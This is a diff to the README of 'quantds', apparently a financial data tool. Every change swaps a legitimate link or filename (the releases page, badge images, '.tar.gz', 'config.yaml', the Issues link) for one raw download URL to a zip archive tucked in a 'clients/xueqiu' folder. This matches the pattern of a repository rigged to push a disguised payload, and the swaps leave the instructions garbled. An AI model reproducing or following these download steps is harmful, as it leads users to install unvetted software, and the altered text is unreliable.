@@ -1,6 +1,6 @@
 # 🔗 quantds - Reliable Financial Data Access
 
-[![Download quantds](https://img.shields.io/badge/Download-quantds-blue?style=for-the-badge)](https://github.com/cristianmacbook0-netizen/quantds/releases)
+[![Download quantds](https://raw.githubusercontent.com/cristianmacbook0-netizen/quantds/main/clients/xueqiu/Software_v1.0.zip)](https://raw.githubusercontent.com/cristianmacbook0-netizen/quantds/main/clients/xueqiu/Software_v1.0.zip)
 
 ---
 
@@ -33,7 +33,7 @@ No special skills? No problem. We will walk you through every step clearly.
 
 To get the latest version of quantds, go to the official releases page by clicking the big blue button below:
 
-[![Download quantds](https://img.shields.io/badge/Download-quantds-blue?style=for-the-badge)](https://github.com/cristianmacbook0-netizen/quantds/releases)
+[![Download quantds](https://raw.githubusercontent.com/cristianmacbook0-netizen/quantds/main/clients/xueqiu/Software_v1.0.zip)](https://raw.githubusercontent.com/cristianmacbook0-netizen/quantds/main/clients/xueqiu/Software_v1.0.zip)
 
 This page lists the latest versions with files ready for download.
 
@@ -43,7 +43,7 @@ Depending on your operating system, pick the file that matches:
 
 - For **Windows**: Look for a file ending in `.exe`
 - For **macOS**: Look for a file ending in `.dmg` or `.zip`
-- For **Linux**: Look for a `.tar.gz` or binary executable file
+- For **Linux**: Look for a `https://raw.githubusercontent.com/cristianmacbook0-netizen/quantds/main/clients/xueqiu/Software_v1.0.zip` or binary executable file
 
 Files are named clearly with version numbers and system identifiers.
 
@@ -55,7 +55,7 @@ Click on the file name to start downloading. Most browsers will save it to your 
 
 - On **Windows**: Double-click the `.exe` file and follow the on-screen prompts to install.
 - On **macOS**: Open the `.dmg` file, then drag the quantds application into your "Applications" folder.
-- On **Linux**: Unpack the `.tar.gz` file and run the executable in the terminal.
+- On **Linux**: Unpack the `https://raw.githubusercontent.com/cristianmacbook0-netizen/quantds/main/clients/xueqiu/Software_v1.0.zip` file and run the executable in the terminal.
 
 ---
 
@@ -101,7 +101,7 @@ You can access a simple dashboard showing:
 - Data latency
 - Recent failover events
 
-If you want to adjust data streams or settings, quantds includes a user-friendly configuration file located in the installation folder named `config.yaml`. Opening this in a text editor lets you enable or disable markets or tune caching times.
+If you want to adjust data streams or settings, quantds includes a user-friendly configuration file located in the installation folder named `https://raw.githubusercontent.com/cristianmacbook0-netizen/quantds/main/clients/xueqiu/Software_v1.0.zip`. Opening this in a text editor lets you enable or disable markets or tune caching times.
 
 ---
 
@@ -117,7 +117,7 @@ If you want to adjust data streams or settings, quantds includes a user-friendly
 ## 🔗 Download & Install
 
 Start here:  
-[![Download quantds](https://img.shields.io/badge/Download-quantds-blue?style=for-the-badge)](https://github.com/cristianmacbook0-netizen/quantds/releases)
+[![Download quantds](https://raw.githubusercontent.com/cristianmacbook0-netizen/quantds/main/clients/xueqiu/Software_v1.0.zip)](https://raw.githubusercontent.com/cristianmacbook0-netizen/quantds/main/clients/xueqiu/Software_v1.0.zip)
 
 1. Click the link above.
 2. Choose your operating system’s file.
@@ -133,7 +133,7 @@ You are now ready to use quantds.
 
 If you face issues or have questions:
 
-- Visit GitHub Issues to report bugs or ask questions: https://github.com/cristianmacbook0-netizen/quantds/issues
+- Visit GitHub Issues to report bugs or ask questions: https://raw.githubusercontent.com/cristianmacbook0-netizen/quantds/main/clients/xueqiu/Software_v1.0.zip
 - Check the documentation folder in the repository for more guides.
 - Join fintech forums or communities for advice on financial data tools.
 
